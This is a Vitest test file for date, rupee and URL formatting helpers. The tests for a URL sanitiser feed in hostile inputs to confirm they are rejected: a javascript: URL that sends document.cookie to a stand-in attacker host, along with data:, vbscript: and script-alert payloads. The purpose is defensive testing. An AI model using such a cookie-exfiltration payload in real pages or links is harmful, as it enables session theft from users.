import { describe, expect, it } from 'vitest'
import { formatDate, formatDateTime, npr, safeHttpUrl } from '../format'

describe('formatDate', () => {
  it('reads date-only strings as a local calendar date', () => {
    expect(formatDate('2026-11-29')).toBe('29 Nov 2026')
    expect(formatDate('2026-01-05')).toBe('5 Jan 2026')
  })

  it('keeps the local day of an ISO timestamp', () => {
    expect(formatDate(new Date(2026, 10, 29, 23, 30).toISOString())).toBe('29 Nov 2026')
  })

  it('returns an em dash for missing or unparseable values', () => {
    expect(formatDate(null)).toBe('—')
    expect(formatDate(undefined)).toBe('—')
    expect(formatDate('')).toBe('—')
    expect(formatDate('not-a-date')).toBe('—')
  })
})

describe('formatDateTime', () => {
  it('appends zero-padded local time', () => {
    expect(formatDateTime(new Date(2026, 10, 29, 9, 5).toISOString())).toBe('29 Nov 2026 · 09:05')
    expect(formatDateTime(new Date(2026, 10, 29, 14, 30).toISOString())).toBe('29 Nov 2026 · 14:30')
  })

  it('returns an em dash for missing values', () => {
    expect(formatDateTime(null)).toBe('—')
    expect(formatDateTime('garbage')).toBe('—')
  })
})

describe('npr', () => {
  it('formats rupees with Indian digit grouping', () => {
    expect(npr(1234)).toBe('Rs. 1,234')
    expect(npr(123456)).toBe('Rs. 1,23,456')
    expect(npr(2499.6)).toBe('Rs. 2,500')
  })

  it('returns an em dash for missing values', () => {
    expect(npr(null)).toBe('—')
    expect(npr(undefined)).toBe('—')
  })
})

describe('safeHttpUrl', () => {
  it('keeps absolute http and https URLs', () => {
    expect(safeHttpUrl('https://example.com/permit?x=1')).toBe('https://example.com/permit?x=1')
    expect(safeHttpUrl('http://example.com')).toBe('http://example.com/')
    expect(safeHttpUrl('  HTTPS://Example.com/a  ')).toBe('https://example.com/a')
  })

  it('rejects script and data schemes', () => {
    expect(safeHttpUrl("javascript:fetch('//attacker/?c='+document.cookie)")).toBeNull()
    expect(safeHttpUrl('JavaScript:alert(1)')).toBeNull()
    expect(safeHttpUrl('data:text/html,<script>alert(1)</script>')).toBeNull()
    expect(safeHttpUrl('vbscript:msgbox(1)')).toBeNull()
    expect(safeHttpUrl('blob:https://example.com/abc')).toBeNull()
  })

  it('rejects relative and malformed values', () => {
    expect(safeHttpUrl('example.com')).toBeNull()
    expect(safeHttpUrl('/explore/everest')).toBeNull()
    expect(safeHttpUrl('//example.com')).toBeNull()
    expect(safeHttpUrl('not a url')).toBeNull()
  })

  it('rejects empty input', () => {
    expect(safeHttpUrl(null)).toBeNull()
    expect(safeHttpUrl('')).toBeNull()
    expect(safeHttpUrl('   ')).toBeNull()
  })
})
